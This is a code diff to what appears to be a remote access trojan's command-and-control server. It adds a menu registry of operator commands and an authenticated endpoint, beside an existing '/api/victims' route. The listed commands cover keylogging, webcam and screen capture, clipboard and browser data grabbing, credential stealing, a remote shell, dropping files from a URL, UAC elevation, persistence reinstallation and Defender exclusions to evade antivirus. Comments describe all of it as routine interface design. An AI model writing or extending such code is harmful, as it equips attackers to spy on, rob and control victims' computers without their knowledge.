@@ -18,6 +18,112 @@ const SESSION_SECRET = process.env.SESSION_SECRET || "";
 const SKEW_SECONDS = 300;
 const MAX_BODY = 12 * 1024 * 1024;
 
+// The menu lives here, next to the routes that have to answer it. The panel used
+// to carry its own copy of the module tree, so a verb renamed on the agent left a
+// button that queued a command nobody handled and a result nobody read. One
+// registry, one source of truth: the panel renders whatever the server serves.
+// `danger` marks a verb that ends the session or wipes state, so the UI can ask
+// before queueing it.
+const ACTIONS = [
+  {
+    label: "Système",
+    items: [
+      { label: "Informations", verb: "info" },
+      { label: "Posture / privilèges", verb: "status" },
+      { label: "Processus", verb: "ps" },
+      { label: "Services", verb: "service_list" },
+      { label: "Démarrage", verb: "startup_list" },
+      { label: "Tâches planifiées", verb: "task_list" },
+      { label: "Registre (Run)", verb: "registry_list" },
+      { label: "Disques", verb: "drives" },
+      { label: "Antivirus", verb: "av" }
+    ]
+  },
+  {
+    label: "Fichiers",
+    items: [
+      { label: "Explorateur", verb: "ls", args: "" },
+      { label: "Bureau", verb: "ls", args: "%USERPROFILE%\\Desktop" },
+      { label: "Documents", verb: "ls", args: "%USERPROFILE%\\Documents" },
+      { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\\Downloads" },
+      { label: "Changer de dossier", verb: "cd", prompt: "chemin du dossier" },
+      { label: "Exécuter", verb: "run", prompt: "chemin du fichier" },
+      { label: "Récupérer un fichier", verb: "download", prompt: "chemin complet" },
+      { label: "Déposer depuis une URL", verb: "upload", prompt: "url puis chemin" },
+      { label: "Fichier hosts", verb: "hosts" }
+    ]
+  },
+  {
+    label: "Surveillance",
+    items: [
+      { label: "Capture d'écran", verb: "screen" },
+      { label: "Rafale (3 frames)", verb: "burst", args: "3" },
+      { label: "Caméra", verb: "cam" },
+      { label: "Caméra — 2e périphérique", verb: "cam", args: "1" },
+      { label: "Presse-papiers", verb: "clip" },
+      { label: "Keylogger — démarrer", verb: "keylog", args: "on" },
+      { label: "Keylogger — arrêter", verb: "keylog", args: "off" },
+      { label: "Keylogger — dump", verb: "keylog", args: "dump" },
+      { label: "Keylogger — effacer", verb: "keylog", args: "clear" }
+    ]
+  },
+  {
+    label: "Réseau",
+    items: [
+      { label: "Shell", verb: "shell", prompt: "commande" },
+      { label: "WiFi", verb: "wifi" },
+      { label: "Connexions", verb: "netstat" },
+      { label: "Navigateurs", verb: "browsers" }
+    ]
+  },
+  {
+    label: "Récupération",
+    items: [
+      { label: "Voler les identifiants", verb: "steal" },
+      { label: "État du bundle", verb: "zipinfo" },
+      { label: "Lister les fichiers reçus", verb: "_uploads" },
+      { label: "Historique des commandes", verb: "_history" },
+      { label: "Chat", verb: "_chat" },
+      { label: "Message à l'écran", verb: "chat", prompt: "texte" }
+    ]
+  },
+  {
+    label: "Élévation et évasion",
+    items: [
+      { label: "Chaîne UAC", verb: "elevate" },
+      { label: "Reprendre la session en high", verb: "reclaim" },
+      { label: "Réinstaller la persistance", verb: "persist" },
+      { label: "Extension navigateur", verb: "ext" },
+      { label: "Exclusions Defender", verb: "defender" },
+      { label: "État de l'évasion", verb: "evade" }
+    ]
+  },
+  {
+    label: "Apparence",
+    items: [
+      { label: "Fond d'écran (URL)", verb: "wallpaper", prompt: "url de l'image" },
+      { label: "Rotation d'écran", verb: "rotate", prompt: "0 | 90 | 180 | 270" },
+      { label: "Inverser les boutons", verb: "swap" },
+      { label: "Restaurer les boutons", verb: "swap", args: "off" },
+      { label: "Luminosité", verb: "bright", prompt: "0-100" },
+      { label: "Écrans éteints", verb: "screens" },
+      { label: "Volume", verb: "volume", prompt: "up | down | mute" }
+    ]
+  },
+  {
+    label: "Divers",
+    items: [
+      { label: "Message à l'écran", verb: "msgbox", prompt: "texte" },
+      { label: "Synthèse vocale", verb: "tts", prompt: "texte" },
+      { label: "Bip", verb: "beep" },
+      { label: "Rickroll", verb: "rickroll" },
+      { label: "Verrouiller", verb: "power", args: "lock" },
+      { label: "Redémarrer", verb: "power", args: "restart", danger: true },
+      { label: "Éteindre", verb: "power", args: "shutdown", danger: true }
+    ]
+  }
+];
+
 if (!DATABASE_URL || !AGENT_SECRET || !PANEL_PASS) {
   console.error("missing DATABASE_URL / AGENT_SECRET / PANEL_PASS");
   process.exit(1);
@@ -392,6 +498,11 @@ const server = http.createServer(async (req, res) => {
         "set-cookie": "sid=; Path=/; HttpOnly; Max-Age=0; Secure"
       });
       return res.end(JSON.stringify({ ok: true }));
+    }
+
+    if (path === "/api/actions") {
+      if (!requireAuth(req, res)) return;
+      return json(res, 200, { ok: true, groups: ACTIONS });
     }
 
     if (path === "/api/victims") {
